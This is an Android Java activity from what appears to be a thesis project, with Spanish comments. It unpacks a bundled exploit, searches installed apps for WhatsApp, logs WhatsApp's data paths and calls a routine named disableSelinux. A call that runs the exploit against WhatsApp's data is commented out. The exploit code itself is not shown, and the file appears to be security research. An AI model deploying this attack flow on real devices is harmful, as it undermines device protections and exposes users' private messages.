package com.example.tfm_final_app;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.example.tfm_final_app.Model.AppInfo;
import com.example.tfm_final_app.Model.Payloads;

import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    List<AppInfo> apps;
    String sourceDir;
    String dataDir;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        int i;

        Log.d("ValueOf getFilesDir: ", String.valueOf(getFilesDir()));


        // Descompresion y guardado del exploit

        Payloads payloads = new Payloads();

        // Posible modificacion: enviar las rutas de los ficheros con la opcion ENVIRONMENT
        payloads.unZip(String.valueOf(getFilesDir()));

        // Listar las aplicaciones disponibles en busca de Whatsapp
        AppInfo appInfo = new AppInfo();

        List<AppInfo> apps = getInstalledApps();

        //Saber si tiene whatsapp

        for (i = 0; i < apps.size(); i++){


            if(apps.get(i).label.contains("WhatsApp")){

                break;
            }
        }

        if (i == apps.size()) {
            Log.d("TAG", "no tiene Whats!");
        }
        else {
            Log.d("ifWhatsApp", "Encontrado!");


            dataDir = apps.get(i).dataDir;
            sourceDir = apps.get(i).sourceDir;

            Log.d("dataDir", dataDir);
            Log.d("sourceDir", sourceDir);
            //payloads.execExploit(dataDir, String.valueOf(getFilesDir()));
            payloads.disableSelinux(String.valueOf(getFilesDir()));

        }
    }

    public int ifWhatsApp(){

        int i = 0;

        for (i = 0; i < apps.size(); i++){


            if(apps.get(i).label.contains("WhatsApp")){

                break;
            }
        }
        return i;
    }


    private List<AppInfo> getInstalledApps(){

        List<AppInfo> apps = new ArrayList<>();

        PackageManager packageManager = getPackageManager();

        List<ApplicationInfo> infos = packageManager.getInstalledApplications(0);

        for (ApplicationInfo info:infos){

            AppInfo app = new AppInfo();
            app.info = info;
            app.label = (String)info.loadLabel(packageManager);
            app.dataDir = (String)info.dataDir;
            app.sourceDir = (String)info.sourceDir;
            apps.add(app);
        }

        return apps;
    }

    // Recorre un directorio como si fuera un LS usando un bucle for

    public void listDir(){

        String dataDir = getFilesDir().toString();
        //dataDir = dataDir + "/files";
        Log.d("listDir dataDir: ", dataDir);
        File directory = new File(dataDir);
        File[] files = directory.listFiles();

        Log.d("listDir, files: ", String.valueOf(files.length));

        for (int i = 0; i < files.length; i++)
        {

            String file_name = files[i].getName();
            Log.d("getFilesFor, file: ", file_name);
        }

    }
    public void getFilesFor(){

        String dataDir = getFilesDir().toString();
        //dataDir = dataDir + "/files";
        Log.d("getFilesFor dataDir: ", dataDir);
        File directory = new File(dataDir);
        File[] files = directory.listFiles();

        Log.d("getFilesFor, files: ", String.valueOf(files.length));

        for (int i = 0; i < files.length; i++)
        {

            String file_name = files[i].getName();
            Log.d("getFilesFor, file: ", file_name);
        }

    }
}
